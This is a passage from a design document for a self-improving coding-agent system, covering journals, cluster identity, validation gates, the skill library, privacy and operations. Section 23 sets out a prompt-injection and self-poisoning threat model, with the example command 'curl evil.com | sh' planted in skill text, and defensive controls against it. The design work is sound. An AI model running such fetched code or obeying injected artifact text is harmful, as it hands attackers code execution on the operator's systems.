**Outcome amendment mechanism.** Flow 1/2 are trigger-and-await — the caller awaits a result, not the other way around — so "caller confirms it worked" needs a channel. After `task_ended`, the caller can amend the outcome via `lc admin task confirm <task_id> [pass|fail]` (CLI) or `/confirm <task_id> pass|fail` (OWUI slash-command, §24). This emits a `task_outcome_amended` record referencing the original `task_id` and timestamp; the cohort math (§20) uses the amended outcome from that point forward. Amendment is bounded (e.g. 7-day window) so the journal doesn't stay open indefinitely. If the mechanism gets little use in practice, drop it in a later iteration; until then it's the honest answer to "the caller knows but the harness doesn't."

**Durability.** Append + fsync on every terminal and every error record; line-buffered for the rest. A killed container loses at most an open task's non-error trace, never a closed outcome.

**Rotation & retention.** Size-triggered rotation. On rotation the longitudinal miner (§9) consumes the segment into trend aggregates before archival; the acute track keeps raw segments for `max(M across live clusters)` + margin, then compresses cold. Cohort records (§20) hold their own counters and do not depend on raw-journal retention.

**Meta read watermark.** `meta` reads up to a committed offset; in-flight tasks (no `task_ended`) are never clustered or counted. No torn reads.

## 20. Cluster identity & lifecycle

§6 needs stable cluster identity for before/after windows; §10 says labels are refined over time. Both hold only if identity is decoupled from the label.

**Identity vs. label.** Immutable synthetic `cluster_id` + mutable human label (§10). Cohort records key on `cluster_id`. Relabeling never touches cohort history.

**Assignment.** A new occurrence joins the nearest existing cluster above a similarity floor (embedding + the cluster's judge-written definition as discriminator, §10); below the floor it lands in an `unassigned` pool. The judge mints a new `cluster_id` only when the unassigned pool itself forms a coherent group — never one-off.

**Split / merge lineage.** Split/merge events record parent↔child `cluster_id`s. A split copies the parent window to each child marked `inherited` (not `observed`); escalation (§6) cannot fire on inherited counts — a child must accrue its own post-event evidence. A merge sums observed counts and resets the quarantine window. Without lineage, a relabel silently fabricates or resets persistence.

**Two cadences, deliberately unequal.** Clustering (judge reshapes the taxonomy) runs slow over a large window; escalation evaluation (§6) runs faster over clusters that already exist. This resolves the chicken-and-egg: occurrences are assigned at ingest, so you never need a cluster to count one; the judge only periodically reshapes, carrying lineage so counts survive.

**Cohort counters are a derived index, not primary state.** The journals (§19) are the durable source of truth; cohort counters are an event-sourced projection over them — periodically checkpointed, fully **rebuildable from the journals on demand**. A corrupt counter file is a recoverable incident (replay the journals; restore the checkpoint), not a data loss. This also means schema changes to the cohort store don't require migration drama — bump the version, rebuild from journals. Without this discipline a single bad fsync ends cohort history; with it, the cohort store is cheap to evolve and cheap to recover.

## 21. Validation semantics

§13's "must not regress against baseline" has three undefined terms in five words.

**Baseline.** The Polyglot score at the last `main` green tag (§12), **re-measured on the current biased subset** (§13 biases per cluster — a stale global number is invalid). A successful merge sets the new baseline.

**"Regress" is quantitative.** Block the merge if the candidate subset scores below baseline by more than a noise margin, at a minimum subset N. Below N → "insufficient evidence", not a pass. A single-exercise flip inside the margin is not a regression. N and margin tuned in preflight against measured Polyglot variance (§15 open item).

**The artifact must be exercised.** A tier-0/1 entry matters only if the augmenter (§22) selects it into context during the validation tasks. If it was never in-context, the gate measured nothing → result is **void**, not pass. Validation logs the augmenter's per-task selection to assert this. Tier-3 is already covered by §18 step 4's repro corpus.

**Efficacy & retirement — no-regression is not enough.** "Does no harm" merges an artifact; it does not justify keeping it. Each merged artifact carries its cluster's cohort window (§6/§20). If post-intervention rate is statistically indistinguishable from pre after the window, the artifact is auto-flagged `ineffective` and reverted on the next iteration (revert is §4-whitelisted). Keeps the library lean (§22) and stops dead weight loading into every future context. Retirement is journaled.

## 22. Skill library lifecycle

§11 names the loader problem without closing it.

**Frontmatter schema (closes the §15 item).** Required: `id`, `cluster_id` (§20), `tier`, `lang`, `domain`, `tool`, `task_shape`, `created`, `supersedes` (nullable), `status` ∈ {`active`, `superseded`, `retired`}. No artifact is written without all keys — enforced at draft time (§16 step 4).

**Three consumption paths, not one.** The four artifact types of §5 are not all consumed the same way:

- **Skill entries** (tier-0 knowledge, tier-1 tool-craft) — selected per-task by **the augmenter** (this section), injected into the agent's prompt context.
- **Plan-template slots** (tier-1) — additions to the planner's prompt structure. Loaded once at planner-process boot from `skill/plan-slots/*.md`; not selected per-task. A new plan-slot artifact requires the planner to re-read its template (cheap; no container restart needed — the planner watches the file).
- **Routing rules** (tier-2) — loaded once at router-process boot from a config file, consulted per task by the router at decision time. Same hot-reload pattern as plan-slots.

The augmenter's selection logic below applies to **skill entries only**. Plan-slots and routing rules are configuration, not retrieval — they apply universally to every task once installed, gated only by their own internal conditions (e.g. a routing rule's `if lang == rust` check). Conflating these paths was a real ambiguity in earlier drafts.

**Augmenter selection (skill entries).** Hybrid: hard filter on structured tags (lang/domain/task-shape inferred from the trigger + early tool calls) → embedding rank within that set → **hard token budget**. Over budget, prefer **cohort-proven (§21) entries and tighter match quality**; tier is _not_ a tiebreaker on its own. A tightly-matched tier-0 knowledge entry is often more useful in-context than a loosely-matched tier-1 tool-craft entry, and the assumption that higher tier = more general value isn't reliable. Tier governs _production discipline_ (§5–§6), not _runtime selection_. Per-task selection is logged — required by §21's in-context assertion.

**Supersession, not accretion.** A new artifact on an existing `cluster_id` sets `supersedes` to the prior `id` and flips the prior to `superseded` (archived, not deleted — audit + rollback). The augmenter selects only `active`. Prevents two live entries giving contradictory advice for one cluster.

**Cross-cluster contradiction** can't be auto-resolved (different clusters, both right in context). A periodic judge pass over the active set flags them to the operator surface (§24), never silently merges.

**Retirement.** §21 efficacy drives it: `ineffective` → `retired`, dropped from selection, kept on disk + journaled.

## 23. Privacy, judge independence & poisoning

**Judge stays in-stack (decision).** The judge runs on the in-stack `llama-cpp` backend (e.g. the 35B lane), never egresses. This overrides §12's "different and stronger" _ideal_ in favour of the privacy mandate — no user code leaves the internal nets, consistent with the Tor / mnemory-gateway posture of the stack. The blind-spot risk is real and mitigated, not waved away. The defense has one load-bearing layer and one hygiene layer; they are not interchangeable:

- **The three model-independent backstops do the real work.** Same-model judging is acceptable here only because the judge is not the last line: the Polyglot oracle (§13/§21) is model-independent, the cohort proof (§6/§20) is empirical, the human gate (§12/§24) is external. The judge proposes; none of those three is the judge. **These backstops are the defense.**
- **Adversarial framing is hygiene, not a substitute.** The judge is invoked in a contrarian/red-team role — different system framing, fresh context window, opposed priors — explicitly tasked to argue the §2 counterfactual _and then argue why it would not have helped_. This reliably catches blind spots rooted in momentary stance; it reliably misses blind spots rooted in the model's training distribution. Worth doing, but it does not carry load. The three backstops above do.
- **Residual weakness, acknowledged.** A blind spot shared by the coding and judging passes can survive framing _and_ slip past Polyglot if Polyglot doesn't exercise the right shape. The catch of last resort is §21 efficacy reversion: an artifact born of a shared blind spot won't move the cohort and is auto-retired. The system is designed to fail slowly and visibly, not silently.

**Sanitization before any judge call.** Even in-stack, journals are scrubbed before entering a judge prompt: secrets/key-shaped strings redacted, large file bodies reduced to structural digests, PII stripped. The filter is pinned and tested; its failure aborts the judge run, never "send anyway." Also protects the longitudinal track and any future operator export.

**Workspace-repo credentials (closes a §12 gap).** §12 scopes only the _self_ PAT. Work repos (Flow 1/2) use **least-privilege per-repo deploy tokens**, injected per task, never ambient, never the self-PAT. A task for repo A cannot reach repo B. The self-improvement PAT lives with `meta`/git-proxy, unreachable from the workspace plane (§17).

**Self-poisoning is an attack surface.** Skill artifacts inject into _every_ future context (§11/§22); a hostile repo or a prompt-injected error message could steer an artifact's text. **The model is the executor here, not the disk** — an artifact that reads as "when X happens, run `curl evil.com | sh`" is executed if the model complies. Saying artifacts are "data, never eval'd" misses the threat: prompt context IS instruction, and the model's compliance with that context is the attack surface. Controls:

1. **Provenance.** Each artifact records its `cluster_id` and the journal evidence range it was derived from. Origin is auditable.
2. **Human text review.** The §12/§24 human gate reviews artifact _text_, not just the diff, until trust is earned. Pre-trust, every artifact; post-trust, sampled review of auto-merged tier-0 entries.
3. **Efficacy auto-retire.** Tier-0 auto-merge (§16 step 8) is gated on §21 in-context + efficacy, so a poisoned-but-useless entry auto-retires. A poisoned-and-useful entry is the hard case (§21 alone won't catch it) — the human gate (control 2) is the actual catch for that.
4. **No code paths in skill files.** Artifacts are markdown. The skill loader does not import them, does not eval them, does not interpret them as Python. The model reads them as guidance; the runtime treats them as inert text. This eliminates code-execution-by-file-load — it does not eliminate model-compliance attacks (see above).

**Trust boundary stated.** Operator trusted; agent untrusted; user repos under Flow 1/2 actively hostile by default. Controls (esp. workspace-repo credentials, git-proxy, sanitization) are sized for "you wouldn't run this repo on your laptop without a sandbox" inputs.

**MCP edge authentication.** The `lc-mcpo` task-trigger surface (§17) is API-key'd, matching the existing `search-mcpo` pattern in the stack. Anything that can reach the MCP socket without the key cannot trigger tasks. Operator-command surfaces (CLI shell access; OWUI authn) authenticate at their own edges (§24 privilege separation); the MCP key is for task triggers only.

**Sanitization audit loop.** The sanitization filter is "pinned and tested," but filters drift — new content patterns appear in journals that the original test set didn't cover. Monthly audit: sample N raw journal records (uniformly across `repo`/`lang`), run the filter, **human-review for false negatives**. Findings update the filter and its test set. Cadence is open in §15 — pick after the first sanitization regression scare; until then, monthly is the default. Without this, you discover filter drift by reading your own users' code in someone else's blog post.

## 24. Meta-loop operations

Operational discipline the rest of the doc assumes but never states.

**Single-flight.** At most one `meta` iteration in progress. A tier-3 candidate validation (§18) holds the lock for its whole lifecycle. The acute track keeps _recording_ throughout — the inner loop never blocks on the outer loop (§3); only escalation/artifact/merge actions serialize.

**Budget cap.** Per-window ceilings: artifacts/iteration (one — §5), candidate validations/day, **judge wall-clock minutes/day** (the judge is local llama-cpp — the real cost is GPU-time, not API tokens), Polyglot exercise-runs/day, journal-write rate. Exceeding a ceiling defers; it never drops _evidence_. Stops a runaway loop exhausting GPU/disk.

**Deferral queue is bounded — evidence is not.** "Defers, never drops evidence" is only true while the iteration queue is finite. Under sustained backlog, evidence remains durable in the journals (the cohort math reads from them on each iteration), but pending _iterations_ stack. Policy:

- **Soft limit** on queue depth → alarm on the operator surface (below).
- **Hard limit** → **coalesce, don't drop.** Coalescing is per-cluster: multiple deferred iterations for the same `cluster_id` collapse into one entry. When that entry eventually runs, cohorts and clusters are re-read fresh from the journals, so the collapsed iteration uses the latest evidence rather than stale snapshots taken at queue time. Cross-cluster iterations are FIFO; no cluster is starved by another.
- Evidence (journals, cohort counters) is preserved throughout. Only the iteration queue is bounded; iterations are always replayable later from the journals if needed.

**The operator surface _is_ the approval interface.** The §12 human gate needs somewhere to live. One surface lists: pending artifacts (text + provenance §23 + cohort §20), tier-3 §8 justifications, contradiction flags (§22), efficacy-reversion notices (§21), queue-depth alarms (above). Approve/reject here is the merge gate. Pre-trust, everything routes here; post-trust, only tiers ≥ 1 and all flags.

**Operator surface forms.** Two surfaces, same underlying control plane, built in sequence:

- **CLI** — ships first. Near-free against little-coder's existing CLI. Adds operator subcommands (`lc admin project switch`, `lc admin pending`, `lc admin approve <id>`, `lc admin upstream pull`, etc.) and the approval flow. Sufficient for the operator gate from day one.
- **OWUI pipeline** — the next real implementation effort after CLI lands. Not deferred indefinitely. An OWUI pipeline interfaces with little-coder's MCP surface (§17) so chat-shaped interactions feel as effective as the CLI. Two distinct interaction types share the surface:
  - _Task triggers_ map naturally to chat (long, streaming, conversational).
  - _Operator commands and approvals_ map to slash-commands (`/project repo:`, `/upstream pull`, `/approve <id>`, `/pending`) and structured renderings inside chat messages — an artifact-review message shows artifact text, §20 cohort evidence, §23 provenance, and Approve/Reject controls. This is a real UI design problem, not just text return.

**Privilege separation across surfaces.** Operator commands and approvals are authenticated at the surface — CLI is gated by host shell access; OWUI is gated by whatever auth OWUI is configured with — never by the MCP server itself. The MCP server takes task triggers; operator authority is checked at the edge. A task trigger from a regular user cannot escalate into an operator action by being shaped like one.

**Failure semantics — nothing fails open.** Judge unreachable → defer, alarm, no merge. Polyglot harness won't run → "insufficient evidence" (not pass), defer. Candidate won't boot (§18 step 2) → fail closed, tear down, cluster stays at its current tier (no escalation credit for a failed deploy). Every failure journaled.

**Preflight → meta-on transition (closes a §14 gap).** Exit preflight only when, against real journals: (a) ≥ K distinct clusters each have ≥ their M window (§6) of _observed_ occurrences; (b) Polyglot baseline variance is measured (feeds §21's N/margin); (c) the counterfactual+adversarial judge prompt has been dry-run on real examples and human-rated. Until all three: journals on, meta off. The transition is a human decision, journaled — not an automatic threshold.

**Cohort scoping is per-language, not per-repo.** A craft gap (Rust lifetimes) recurs across repos; per-repo scoping never reaches M (§6) and never escalates. Clusters and their M windows are scoped by `lang` + `task_shape`, aggregated across repos. `repo` is recorded per occurrence (§19) for drill-down, not as a cohort boundary.

**Resource isolation between flows: defer policy.** llama-cpp runs `n_parallel=2` on the 27B variant — two concurrent inference lanes. Flow 1/2 (interactive) and the meta-loop (judge calls, candidate validation) compete for those lanes. **Policy: meta-loop checks slot occupancy before issuing inference requests and backs off when interactive lanes are busy.** Interactive always wins. Meta progress slows under sustained interactive load but never blocks a user. No llama-swap config changes required; matches the pragmatic-first-cut pattern used elsewhere (§18 active-as-driver). Promotion to a reserved meta slot is a later hardening if preflight (§14) shows meta routinely starving — listed open in §15.

**Audit log separation.** Operator actions — `project_switched`, `upstream_pulled`, `approve_decision`, `task_outcome_amended`, `artifact_retired`, deploys — go to **`audit.jsonl`**, not the three task journals (§19). Different reader (operator UI vs. `meta`), different retention (longer; audit is forever, task journals rotate), different access controls. Mixing them works but bleeds responsibilities; keeping them separate makes "what did the operator do" answerable without scanning megabytes of tool calls.

**Metrics & alarms beyond journals.** Journals are evidence; metrics are operations. Expose a **Prometheus endpoint** on `agent` and `meta`: queue depth, judge wall-clock minutes/day, GPU minutes/day, candidate-validation duration histogram, journal write rate, sanitization rejection rate, augmenter selection count per artifact (feeds §21 in-context assertion at a glance), llama-cpp slot occupancy. Alarms surface to the operator UI alongside artifact approvals — queue-depth alarm, sanitization-spike alarm, candidate-validation-timeout alarm. Standard stack; no novelty.

**Health checks & graceful shutdown.** Compose healthcheck on `agent` (MCP socket responding) and `lc-mcpo` (`/openapi.json` reachable), matching the `search-mcpo` pattern. SIGTERM behavior: **drain mode** — refuse new task triggers (Flow 1/2 return "shutting down"), allow in-flight tasks to complete up to a configurable deadline, then SIGKILL. Open `task_id`s past the deadline are journaled `task_abandoned` with reason `shutdown`. Volumes (§16 step 1) survive; restart picks up the journals and resumes.

**Testing the meta-loop on golden journals.** Preflight validates against real journals; that's necessary but not sufficient — it tests the journals, not the meta-loop's logic. Add a **golden-journal test suite**: synthetic journals with known cohort shapes that exercise cluster assignment, split/merge lineage (§20), tier escalation (§6), efficacy reversion (§21), and the sanitization filter (§23). Each release of `meta` runs against this suite before deploy. The cost is real (writing the golden cases); the catch is real (a refactor breaks cohort math silently otherwise).

**Sub-service seam for `meta` (note, not now).** `meta` does five things in one box: clustering (§20), judging (§23), drafting (§5), validating (§13/§21), merging (§4 git-proxy). For a working doc, fine. For implementation: these are five sub-services with clean boundaries — they share state via the journals, skill library, and cohort store, not via shared memory. **The seam is worth sketching now even if the split is deferred**: each sub-service reads from the persistent stores and writes through narrow, journaled APIs. When the split happens (likely after tier-1 lands), no architecture change is needed; only process boundaries move.

**Configuration management.** Every tunable in this doc — per-cluster M, N/margin (§21), token/GPU budgets (above), `task_abandoned` timeout per channel (§19), exploration rate (5–10%, §7), coalesce thresholds (above), similarity floor (§20), augmenter budget (§22), audit cadence (§23), sanitization filter ruleset (§23) — lives in a **centralized typed config** (YAML + JSON schema), validated at boot, hot-reloadable where safe (filter ruleset, budgets) and restart-required where not (schema-affecting fields). Prose-as-config doesn't survive contact with operations.

**Schema migration discipline.** Journal envelope (§19), frontmatter schema (§22), cohort store (§20), and config schema all carry `schema_version` and evolve over time. Readers tolerate older shapes (forward-compat); migrations are explicit operator-run jobs. **Tier-3 self-changes cannot propose schema changes** — schema evolution is operator-only, full stop. Mixing autonomous self-modification with schema migration is exactly the class of failure §8 was built to prevent; the §8 justification cannot articulate "no skill could have replaced this" for a data-shape change.
